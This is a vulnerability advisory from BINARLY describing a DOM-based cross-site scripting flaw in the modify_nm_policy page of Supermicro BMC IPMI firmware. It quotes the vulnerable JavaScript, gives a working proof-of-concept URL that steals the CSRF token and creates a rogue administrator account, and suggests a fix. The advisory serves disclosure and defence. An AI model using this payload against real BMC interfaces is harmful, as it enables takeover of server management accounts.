# Cross-site scripting vulnerability in Supermicro BMC IPMI firmware in the `modify_nm_policy` webpage using `pdomain` GET parameter

## Summary

**BINARLY team** has discovered a DOM-based cross-site scripting (XSS) vulnerability in the `modify_nm_policy` webpage that uses `pdomain` GET parameter, included in the web server component of Supermicro BMC IPMI firmware, allowing a possible attacker to gain access to an account with administrator privileges.

## Vulnerability Information

* BINARLY internal vulnerability identifier: BRLY-2023-008

## Potential impact

An attacker could exploit this vulnerability to create an account with administrative privileges to the web server component of BMC IPMI software. Such account provides full acess to these settings: System Information, Chassis Locator Control, FRU Reading, Sensor Readings, Event Log, Alert, LDAP, Mouse Mode, Network, SMTP, SSL, Users, Event Action, Power Control, KVM, F/W Update, Logout. It also allows exploitation of vulnerabilities that require authentication.

## Vulnerability description

`modify_nm_policy` HTML page contains the `PageInit()` JavaScript function, which is executed when the webpage is loaded. This function gets the value of the `pdomain` request parameter and then assigns it to the content of the HTML object with id = `PolicyDomain` using the `innerHTML` property without any sanitization.

```javascript
function PageInit()
{
    ...
    PolicyDomainOBJ = document.getElementById("PolicyDomain");
    ...
    PolicyDomainOBJ.innerHTML = GetVars("pdomain");
    ...

function GetVars (str)
{
    url = location.search;
    var parameterList = url.split ("&");
    for (var i = 0; i < parameterList.length; i++) {
        parameter = parameterList[i].split ("=");
        if (parameter[0] == str) {
            return (decodeURIComponent (parameter[1]));
        }
    }
}
```

As a result, arbitrary JavaScript code can be injected into the webpage, which will be executed on behalf of the authenticated user.

## Steps for exploitation

To create an administrator account with username `BRLY` and password `BRLYBRLY` an attacker can trick an authenticated user with administrative privileges to open this link in a web browser:

```
https://192.168.0.8:443/cgi/url_redirect.cgi?url_name=modify_nm_policy&pdomain=%3Cimg%20src%3d1%20onerror%3d'var csrfRegex%3d/CSRF_TOKEN", "([^"]*?)"/g;var csrfMatch%3dcsrfRegex.exec(document.body.innerHTML);var csrf%3dcsrfMatch[1];fetch("https://192.168.0.8:443/cgi/op.cgi",{method:"POST",headers:{"Csrf_token":csrf},body:"op%3dconfig_user%26username%3dBRLY%26original_username%3d2%26password%3dBRLYBRLY%26new_privilege%3d4%26_%3d"})'%3E
```

Here, the `onerror` event is used to execute JavaScript code when the browser tries to download a non-existenting image. The JS code first obtains the user's CSRF token and then uses it to make a `POST` request in order to create a user with administrative privileges and credentials defined by the attacker.

## How to fix it

Ideally, user controlled parameters should not be assigned to HTML elements. If it is not possible in such case, the `pdomain` parameter must be checked against a whitelist of allowed values.
